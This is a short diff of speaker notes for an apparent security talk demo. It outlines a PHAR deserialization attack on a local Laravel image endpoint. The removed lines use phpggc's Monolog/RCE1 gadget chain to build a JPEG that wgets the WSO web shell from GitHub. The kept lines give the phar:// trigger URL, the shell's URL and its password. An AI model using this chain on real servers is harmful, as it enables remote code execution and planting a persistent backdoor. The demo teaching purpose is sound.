@@ -938,9 +938,7 @@ public function image(Request $request)
 ???
 
 - Show example code
-- cd /home/liam/Projects/talks/hackthesystem/tools/phpggc
-- ./phpggc -pj avatar.jpg Monolog/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php -O wso.php" -o loaded-mono.jpg
-- mv loaded-mono.jpg ../../laravel/app/Http/Controllers/
+- ./jpgdemo.sh
 - http://localhost:9999/image?filename=phar://loaded-mono.jpg
 - http://localhost:9999/wso.php
 - PW ghost287
